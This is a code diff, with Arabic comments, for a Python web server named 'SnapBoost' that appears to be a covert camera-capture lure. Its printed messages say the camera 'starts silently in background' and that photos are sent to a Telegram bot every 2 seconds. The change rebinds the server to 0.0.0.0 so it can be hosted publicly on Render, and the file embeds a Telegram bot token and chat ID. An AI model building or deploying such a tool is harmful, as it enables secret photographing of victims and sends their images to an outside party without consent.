@@ -1,6 +1,7 @@
 import socket
 import webbrowser
 from http.server import HTTPServer, BaseHTTPRequestHandler
+import os
 
 # ============================================
 # 🔐 التوكن حقك
@@ -9,7 +10,7 @@ BOT_TOKEN = "8837083581:AAF8_F1BAc2KPm0YbHD9KwSJUwEYsnZq5YM"
 CHAT_ID = "7944049937"
 
 # ============================================
-# 📄 صفحة HTML
+# 📄 صفحة HTML (نفس الكود مع تعديل بسيط)
 # ============================================
 HTML_PAGE = """<!DOCTYPE html>
 <html>
@@ -164,7 +165,7 @@ startCamera();
 </html>"""
 
 # ============================================
-# خادم محلي (منفذ 8085)
+# 🚀 خادم معدل لـ Render
 # ============================================
 class MyHandler(BaseHTTPRequestHandler):
     def do_GET(self):
@@ -178,21 +179,18 @@ class MyHandler(BaseHTTPRequestHandler):
         pass
 
 def start():
-    port = 8085
-    server = HTTPServer(('127.0.0.1', port), MyHandler)
+    # 🔥 التعديل المهم: نستخدم 0.0.0.0 عشان Render يقدر يوصل
+    port = int(os.environ.get('PORT', 8085))
+    server = HTTPServer(('0.0.0.0', port), MyHandler)
     
-    url = f'http://127.0.0.1:{port}'
     print('\n' + '='*55)
-    print(f'✅ SnapBoost Server: {url}')
-    print('📱 Open link in Safari')
-    print('⚠️ Allow camera when prompted (in English)')
+    print('✅ SnapBoost Server is running on Render!')
+    print('📱 Open the URL provided by Render')
+    print('⚠️ Allow camera when prompted')
     print('📸 Camera starts silently in background')
     print('📤 Photos sent to Telegram every 2 seconds')
     print('⏱️ Stops after 30 minutes')
-    print('🛑 Press Ctrl+C to stop')
     print('='*55 + '\n')
-    
-    webbrowser.open(url)
     
     try:
         server.serve_forever()
